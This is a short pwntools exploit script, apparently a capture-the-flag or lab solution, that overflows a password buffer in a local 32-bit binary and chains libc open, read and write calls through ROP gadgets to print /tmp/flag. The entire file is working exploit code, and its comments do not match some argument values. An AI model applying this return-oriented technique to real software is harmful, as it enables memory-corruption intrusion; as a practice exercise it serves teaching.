from pwn import *
io = process('./a32.out')

elf = ELF('./a32.out')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
base_addr = 0xf7c00000 	# varies in different libc and ubuntu version

PPR = base_addr + 0x3958a
PPPR = base_addr + 0x4cab8
writable_addr = 0x804c700
string_addr = 0xffffcfe0
# we need to write string /tmp/flag at the header of buffer
fileName = b'/tmp/flag\0' 
payload = fileName + cyclic(76 - len(fileName)) # buffer length + rbp
# we will execute 'open("/tmp/flag", 0)'
payload += p32(base_addr + libc.symbols['open'])
payload += p32(PPR)
payload += p32(string_addr)
payload += p32(0)
# we will execute 'read(3, writable_addr + 0x100, 0x100)' to read the FLAG
payload += p32(base_addr + libc.symbols['read'])
payload += p32(PPPR)
payload += p32(3)
payload += p32(writable_addr)
payload += p32(10)
# we will execute 'write(1, writable_addr + 0x100, 0x100)' to write FLAG into console
payload += p32(base_addr + libc.symbols['write'])
payload += p32(PPPR)
payload += p32(1)
payload += p32(writable_addr)
payload += p32(10)


# gdb.attach(io, "b *(start+163)") # we can raise a debug interface here
# time.sleep(3)
io.sendafter(b'Password:', payload)
io.interactive()


